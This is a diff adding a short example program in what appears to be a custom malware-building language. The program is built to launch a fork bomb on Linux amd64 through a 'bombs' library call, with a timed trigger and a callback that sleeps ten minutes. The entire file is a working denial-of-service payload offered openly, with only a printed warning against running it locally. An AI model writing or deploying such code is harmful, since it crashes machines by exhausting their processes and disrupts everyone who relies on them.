@@ -1,0 +1,25 @@
+@ Executes a fork bomb @
+
+use system
+use bombs
+use time
+
+[
+    version 2.0
+    output fork_bomb
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+c executioner -> boolean { @ When this function returns, the bomb is executed @
+    system::outln("I'm the bomb!")
+    time::sleep("600") @ Sleep for 10 minutes before returning @
+}
+
+l main_func {
+    system::outln("Warning: Do not try this on your own machine!")
+    bombs::fork_bomb(${"500", "executioner"}$) @ 500 ms until it blows up @
+    system::exit("0")
+}
